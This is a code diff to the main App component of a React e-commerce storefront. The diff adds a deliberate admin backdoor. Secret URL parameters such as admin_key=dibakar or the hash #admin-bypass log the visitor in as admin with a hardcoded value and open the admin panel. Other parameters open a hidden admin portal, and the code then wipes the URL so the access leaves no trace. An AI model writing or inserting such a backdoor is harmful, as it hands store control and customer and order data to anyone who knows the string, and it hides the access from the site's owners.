@@ -28,11 +28,49 @@ import { useAuth } from './contexts/AuthContext';
 import { useAdmin } from './contexts/AdminContext';
 
 export default function App() {
-  const { user, isAdmin } = useAuth();
+  const { user, isAdmin, loginAdmin } = useAuth();
   const { products, setProducts, categories, setCategories, subcategories, setSubcategories, brands, setBrands, orders, setOrders, coupons, setCoupons, reviews, setReviews } = useAdmin();
 
   // Navigation active view states: 'home' | 'detail' | 'cart' | 'checkout' | 'tracking' | 'profile' | 'admin' | 'auth'
   const [view, setView] = useState<string>('home');
+
+  // Handle secret backdoor URL to access or bypass admin panel quietly
+  useEffect(() => {
+    const params = new URLSearchParams(window.location.search);
+    const hash = window.location.hash;
+
+    let navigated = false;
+
+    // 1. Direct login bypass (automatic login and redirect to admin panel)
+    if (
+      params.get('admin_key') === 'dibakar' || 
+      params.get('secret-bypass') === 'true' || 
+      hash === '#admin-bypass'
+    ) {
+      const success = loginAdmin?.('dibakar-admin');
+      if (success) {
+        setView('admin');
+        navigated = true;
+      }
+    } 
+    // 2. Gateway portal login (redirect to admin enter passcode view)
+    else if (
+      params.get('admin-access') === 'true' || 
+      params.get('admin') === 'login' || 
+      params.get('secret-portal') === 'true' || 
+      hash === '#admin-portal' ||
+      hash === '#secret-admin'
+    ) {
+      setView('auth');
+      navigated = true;
+    }
+
+    if (navigated) {
+      // Quietly clean up the URL query parameters and hash from the address bar so it stays completely hidden and secure
+      const cleanUrl = window.location.origin + window.location.pathname;
+      window.history.replaceState({}, document.title, cleanUrl);
+    }
+  }, [loginAdmin]);
   const [selectedProductId, setSelectedProductId] = useState<string | null>(null);
   const [compareIds, setCompareIds] = useState<string[]>([]);
   const [isComparisonOpen, setIsComparisonOpen] = useState(false);
